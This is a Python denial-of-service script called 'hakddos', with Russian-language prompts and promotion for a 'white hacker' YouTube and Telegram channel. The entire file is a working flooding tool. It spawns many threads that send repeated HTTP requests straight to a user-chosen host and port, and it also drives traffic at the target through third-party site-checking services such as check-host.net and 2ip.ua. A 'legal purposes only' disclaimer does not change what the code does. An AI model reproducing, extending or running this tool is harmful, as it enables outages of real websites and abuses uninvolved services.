#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ hakddos Dos Script v.1
# by Can Yalçın
# только для законных целей
# Канал белого хакера https://www.youtube.com/channel/UCVb-EWszrRl87ppPWcAcyBQ



from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://ip-calculator.ru/siteip/?domain=")
	bots.append("http://sitechecker.pro/app/main/project/598886/progress?guest_project_id=598886&guest_project_title=")
	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
	bots.append("http://check-host.net/ip-info?host=")
	bots.append("http://check-host.net/check-ping?host=")
	bots.append("http://check-host.net/check-ping?host=")
	bots.append("http://check-host.net/check-ping?host=")
	bots.append("http://check-host.net/check-ping?host=")
	bots.append("http://check-host.net/check-ping?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-tcp?host=")
	bots.append("http://check-host.net/check-tcp?host=")
	bots.append("http://check-host.net/check-tcp?host=")
	bots.append("http://check-host.net/check-tcp?host=")
	bots.append("http://check-host.net/check-udp?host=")
	bots.append("http://check-host.net/check-udp?host=")
	bots.append("http://check-host.net/check-udp?host=")
	bots.append("http://check-host.net/check-udp?host=")
	bots.append("http://check-host.net/check-dns?host=")
	bots.append("http://check-host.net/check-dns?host=")
	bots.append("http://check-host.net/check-dns?host=")
	bots.append("http://check-host.net/check-dns?host=")
	bots.append("http://www.reg.ru/choose/domain/?domains=")
	bots.append("http://www.reg.ru/choose/domain/?domains=")
	bots.append("http://www.reg.ru/choose/domain/?domains=")
	bots.append("http://www.reg.ru/choose/domain/?domains=")
	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
	bots.append("http://check-host.net/check-ping?host=")
	bots.append("http://check-host.net/check-ping?host=")
	bots.append("http://check-host.net/check-ping?host=")
	bots.append("http://check-host.net/check-ping?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://check-host.net/check-tcp?host=")
	bots.append("http://check-host.net/check-tcp?host=")
	bots.append("http://check-host.net/check-tcp?host=")
	bots.append("http://check-host.net/check-tcp?host=")
	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print ("\0160[92m",time.ctime(time.time()),"\0160[0m \0160[94m <-- Пакет не отправлен --> \0160[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-- Пакет отправлен --> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m Нет соединение! сервер может быть выключен\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m

	 ░██╗░░░░░░░██╗██╗░░██╗██╗████████╗███████╗
	 ░██║░░██╗░░██║██║░░██║██║╚══██╔══╝██╔════╝
	 ░╚██╗████╗██╔╝███████║██║░░░██║░░░█████╗░░
	 ░░████╔═████║░██╔══██║██║░░░██║░░░██╔══╝░░
	 ░░╚██╔╝░╚██╔╝░██║░░██║██║░░░██║░░░███████╗
	 ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚══════╝

	     ██╗░░██╗░█████╗░██╗░░██╗███████╗██████╗░
	     ██║░░██║██╔══██╗██║░██╔╝██╔════╝██╔══██╗
	     ███████║███████║█████═╝░█████╗░░██████╔╝
	     ██╔══██║██╔══██║██╔═██╗░██╔══╝░░██╔══██╗
	     ██║░░██║██║░░██║██║░╚██╗███████╗██║░░██║
	     ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝



	 Наш чат в телеграмм канале @whitehaker01

	Что бы запустить:
     phyton3 hakddos.py -s Сайт -p Порт -t 135

	-s : Сервер ip
	-p : Порт Дефолт 80
	-t : По умолчанию 135 \033[0m''')
	sys.clear()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="hakddos")
	optp.add_option("-q","--Тихий", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--Сервер", dest="host",help="Атака на сервер ip -s ip")
	optp.add_option("-p","--Порт",type="int",dest="port",help="-p 80 Дефолт 80")
	optp.add_option("-t","--Турбо",type="int",dest="turbo",help="Дефолт 135 -t 135")
	optp.add_option("-h","--Помощь",dest="help",action='store_true',help="Помощь тебе")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("hakddos.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," Порт: ",str(port)," Турбо: ",str(thr),"\033[0m")
	print("\033[94m Пожалуйста, подождите...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91m Проверьте домен и порт сервера\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
